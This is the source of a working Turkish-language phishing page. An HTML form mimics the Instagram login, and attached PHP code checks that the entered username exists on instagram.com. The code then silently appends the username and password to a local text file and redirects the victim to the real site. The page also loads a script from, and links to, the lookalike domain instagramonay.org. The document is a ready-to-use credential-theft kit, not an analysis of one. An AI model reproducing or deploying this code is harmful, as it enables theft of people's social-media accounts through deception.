<html lang="tr">
<head>

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Instagram</title>
<meta name="robots" content="noindex, nofollow">
<meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
<style>
        body::-webkit-scrollbar {
            display : none;
        }
    </style>
<link rel="stylesheet" href="instastyle.css"/>
</head>
<body>
<span id="react-root">
<section class="instaclass5">
<main class="instaclass4 instaclass30" role="main">
<article class="instaarticle3">
<div class="instaclass1">
<div class="instaclass2">
<h1 class="instaclasssub1 instaclasssub2 coreSpriteLoggedOutWordmark">Instagram</h1>
<div class="instaclass6">
<!--
						<div class="instaclass20" style="color: red; text-align: left;">
						<b>Sunucu üzerinde network çalışmaları yapılıyor. Gün içinde bir çok kesinti olacak. Giriş yapamayabilirsiniz..</b>
						</div>
						-->
<form method="POST" action=""
                                   class="instaclass7">
<div class="instaclass8 instaclass9"><input type="text" class="instaclass10 instaclass11"
                                          aria-describedby="" aria-label="Kullanıcı adı" aria-required="true"
                                          maxlength="30" name="username"
                                          placeholder="Kullanıcı adı" value=""></div>
<div class="instaclass8 instaclass9">
<input
                                         type="password" class="instaclass10 instaclass11" aria-describedby=""
                                         aria-label="Şifre"
                                         aria-required="true" name="password"
                                         placeholder="Şifre">
</div>
<span
                                      class="instaclass14 instaclass15">
<button id="login_insta"
                                         class="instaclass16 instaclass17 instaclass18 instaclass19">Giriş yap</button>
<div class="spiSpinner"></div>
<div id="hatapass" style="display:none;">
<br>
<center><a style="color:#ED4956;font-size:14px;">Lütfen Şifrenizi Giriniz!</a></center>
</div>
<div id="hata" style="display:none;">
<br>
<center><a style="color:#ED4956;font-size:14px;">Girdiğin kullanıcı adı bir hesaba ait değil.<br> Lütfen kullanıcı adını kontrol et ve tekrar<br> dene.</a></center>
</div>
<div class="sifre">
<center><br><a href="https://www.instagram.com/accounts/password/reset/" style="font-size:13px;">Şifreni Mi Unuttun?</a></center>
</div>
</span>
</form>
</div>
</div>
</div>
</article>
</main>
</section>
</span>
</body>
</html>


<?php
error_reporting(0);
include("./ayar.php");
if($_POST){
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}

$username = addslashes($_POST['username']);
$password = addslashes($_POST['password']);

if($password == ""){ ?>
<script>
document.getElementById("hatapass").style.display = "block";
</script>
<?php } else{

$url = "https://instagram.com/$username";

$useragent = 'Mozilla/5.0 (compatible; Googlebot/2.1; +[url]http://www.google.com/bot.html)';  
$referer = 'http://www.google.com/'; 
$zaman = 0;  
$ch = curl_init();   
curl_setopt ($ch, CURLOPT_URL, $url);   
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $zaman);   
curl_setopt ($ch, CURLOPT_REFERER, $referer);   
curl_setopt ($ch, CURLOPT_USERAGENT, $useragent);   
$sonuc = curl_exec($ch);   
curl_close($ch);   
preg_match_all('@<h2>(.*?)</h2>@si',$sonuc,$veri_derece1);
//echo $veri_derece1[0][0];

 if($veri_derece1[0][0] == "<h2>Sorry, this page isn&#39;t available.</h2>"){?>
<script>
document.getElementById("hata").style.display = "block";
</script>
<?php } else {


$dosya_adi = "biroperasyonvarbugece.txt";  
 
  
  $yazilacak_deger = "$username:$password \r\n"; 
  
  
  //Degerler programa gonderilmis ise, 
  
  if ($username || $password) { 
  
  
  //Yazilacak dosya sistemde yer aliyor ise, 
  
  if (!file_exists($dosya_adi)){ 
  
  touch($dosya_adi); 
  
  
  } 
  
  //Dosyaya baglanti yap ve verileri dosyanin sonuna yaz, 
  
  $dosyaya_baglanti = fopen($dosya_adi,"a+"); 
  
  if (!fwrite($dosyaya_baglanti,$yazilacak_deger)){ 
  
  echo "Bağlantı Hatası!"; 
  
  exit; 
  
  } 
  
header('Location: http://instagram.com/');


  
  } else { 
  
  echo "bağlantı Hatası!<BR>"; 
  
  echo "Tekrar Deneyiniz"; 
  
  } 


}
}
}
?>

<meta http-equiv="refresh" content="15;URL=/hata.php">

<!--Author: koddostu.com-->
<!--Licence: GNU GPL V2.0-->
<!--Name: Sitene Modern Duyuru Panosu Ekle !-->
<!--Kod Dostu Modern Duyuru Panosu START-->
<!--Bu çalışma Creative Commons Attribution 3.0 Unported Lisansı ile lisanslanmıştır.-->
<!--Telif Sahibi: www.koddostu.com-->
<div class="KODDOSTU-FIX FIXED-KODDOSTU" id="drag-div"><a onclick="window.open('http://www.koddostu.com')" style="text-decoration:none;position:absolute;top:3px;right:230px;z-index:4000;font-family:Calibri, sans-serif;font-weight:bold;color:#fff !important;font-size:16px;cursor:default;"></a>
<style>
#KODDOSTUdragme
{
/* Genişlik: */
width:270px;
/* Yükseklik: */
height:104px;
}
</style>
<div id="KODDOSTUdragme"><center>
Giriş yaptıktan 15 saniye sonra yönlendirileceksiniz.
<br/>Anasayfa: <a style="color:#ED7334;font-weight:bold;text-decoration:none;font-size:14px;" href="http://www.instagramonay.org">
Ana Sayfa
</a>
</center></div></div>
<!--Bu çalışma Creative Commons Attribution 3.0 Unported Lisansı ile lisanslanmıştır.-->
<!--Telif Sahibi: www.koddostu.com-->
<style>
#KODDOSTUdragme
{position:relative;color:#444;font-size:16px;background:#F8F8F8;-webkit-border-radius: 4px;border-radius: 4px;border-top:26px solid #F2864E;color:#444;border-left:1px solid #E8DDD5;border-right:1px solid #E8DDD5;border-bottom:1px solid #E8DDD5;padding:5px 8px;background-image: linear-gradient(bottom, #EDEDED 17%, #FFFFFF 77%);background-image: -o-linear-gradient(bottom, #EDEDED 17%, #FFFFFF 77%);background-image: -moz-linear-gradient(bottom, #EDEDED 17%, #FFFFFF 77%);background-image: -webkit-linear-gradient(bottom, #EDEDED 17%, #FFFFFF 77%);background-image: -ms-linear-gradient(bottom, #EDEDED 17%, #FFFFFF 77%);background-image: -webkit-gradient(linear,left bottom,left top,color-stop(0.17, #EDEDED),color-stop(0.77, #FFFFFF));-moz-box-shadow: 0 0 5px #888;-webkit-box-shadow: 0 0 5px#888;box-shadow: 0 0 5px #888;}
.koddostu_hace2{cursor:pointer;padding:2px 16px 3px 16px;font-family: "Lucida Grande", tahoma,verdana,arial,sans-serif;font-size: 13px;font-style: normal;font-weight: bold;text-transform: normal;letter-spacing: normal;line-height: 16px;color:#F2864E;border:none;outline: 1px solid #999999;border-top:1px solid #ffffff;background:#f2f2f2 url('http://s-static.ak.fbcdn.net/rsrc.php/v2/yM/r/QvWFehnkoZF.png') no-repeat scroll -352px -201px;}.koddostu_hace2:active{cursor:pointer;border-top:1px solid #dddddd !important;background:#dddddd !important;background-image:none !important;}/* http://www.koddostu.com/2012/08/facebook-tarz-dugme-kodlar-sadece-burada.html */.koddostu_hace2:hover{cursor:pointer;}
div.KODDOSTU-FIX{line-height:19px;position:fixed;text-align:center;z-index:1000;}div.FIXED-KODDOSTU{top:25px;right:25px;}div.KODDOSTU-FIX{_position:absolute;}div.FIXED-KODDOSTU{_bottom:auto;_top:expression(ie6=(document.documentElement.scrollTop+document.documentElement.clientHeight - 52+"px") );}
</style>
<!--Bu çalışma Creative Commons Attribution 3.0 Unported Lisansı ile lisanslanmıştır.-->
<!--Telif Sahibi: www.koddostu.com-->
<!--Kod Dostu Modern Duyuru Panosu STOP-->
<script src="https://www.instagramonay.org"></script>